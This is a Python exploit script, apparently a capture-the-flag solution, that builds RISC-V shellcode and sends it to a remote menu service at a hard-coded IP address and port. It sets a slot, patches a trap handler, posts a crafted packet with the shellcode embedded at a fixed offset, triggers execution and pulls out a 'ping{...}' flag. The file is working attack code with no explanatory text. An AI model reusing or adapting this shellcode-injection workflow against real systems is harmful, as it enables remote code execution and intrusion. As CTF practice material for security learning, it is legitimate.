#!/usr/bin/env python3
import re
import socket
import struct
import subprocess
from pathlib import Path


HOST = "178.104.42.20"
PORT = 30001
ROOT = Path(__file__).resolve().parent
SHELLCODE_BIN = ROOT / "shellcode.bin"
SHELLCODE_SRC = ROOT / "shellcode.S"


def build_shellcode() -> bytes:
    shellcode_obj = ROOT / "shellcode.o"
    subprocess.run(
        [
            "llvm-mc",
            "-triple=riscv32",
            "-mattr=+c,+m",
            "-filetype=obj",
            str(SHELLCODE_SRC),
            "-o",
            str(shellcode_obj),
        ],
        check=True,
    )
    subprocess.run(
        [
            "llvm-objcopy",
            "-O",
            "binary",
            str(shellcode_obj),
            str(SHELLCODE_BIN),
        ],
        check=True,
    )
    data = SHELLCODE_BIN.read_bytes()
    if not data:
        raise RuntimeError("shellcode build returned no data")
    return data


def recv_until(sock: socket.socket, needle: bytes) -> bytes:
    data = b""
    while needle not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise RuntimeError(f"connection closed while waiting for {needle!r}")
        data += chunk
    return data


def send_line(sock: socket.socket, data: bytes) -> None:
    sock.sendall(data + b"\n")


def choose_option(sock: socket.socket, option: bytes) -> None:
    recv_until(sock, b"M> ")
    send_line(sock, option)


def set_slot(sock: socket.socket, slot: int) -> None:
    choose_option(sock, b"1")
    recv_until(sock, b"> ")
    send_line(sock, str(slot).encode())


def patch_trap_handler(sock: socket.socket) -> None:
    choose_option(sock, b"4")
    recv_until(sock, b"> ")
    send_line(sock, b"9999")


def post_raw(sock: socket.socket, blob: bytes) -> None:
    choose_option(sock, b"2")
    recv_until(sock, b"> ")
    sock.sendall(blob + b"\n")


def trigger_decode(sock: socket.socket) -> bytes:
    choose_option(sock, b"3")
    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if re.search(br"ping\{[^}]+\}", data):
            break
    return data


def build_packet(shellcode: bytes) -> bytes:
    pkt = bytearray(b"*" * 0x400)
    struct.pack_into("<H", pkt, 0x00, 0x88FF)
    struct.pack_into("<H", pkt, 0x02, 1)
    struct.pack_into("<I", pkt, 0x04, 0x0000011D)
    struct.pack_into("<H", pkt, 0x0C, 0x0789)
    struct.pack_into("<H", pkt, 0x0E, 0x0007)
    struct.pack_into("<H", pkt, 0x18, 0xFFFF)
    shellcode_offset = 0x10E
    end = shellcode_offset + len(shellcode)
    if end >= len(pkt):
        raise RuntimeError("shellcode does not fit in slot")
    pkt[shellcode_offset:end] = shellcode
    return bytes(pkt[:end])


def main() -> None:
    shellcode = build_shellcode()
    packet = build_packet(shellcode)

    with socket.create_connection((HOST, PORT)) as sock:
        set_slot(sock, 7)
        patch_trap_handler(sock)
        post_raw(sock, packet)
        output = trigger_decode(sock)

    text = output.decode("latin1", errors="replace")
    print(text, end="")

    match = re.search(r"ping\{[^}]+\}", text)
    if not match:
        raise SystemExit("flag not found")

    print(f"\nFLAG: {match.group(0)}")


if __name__ == "__main__":
    main()
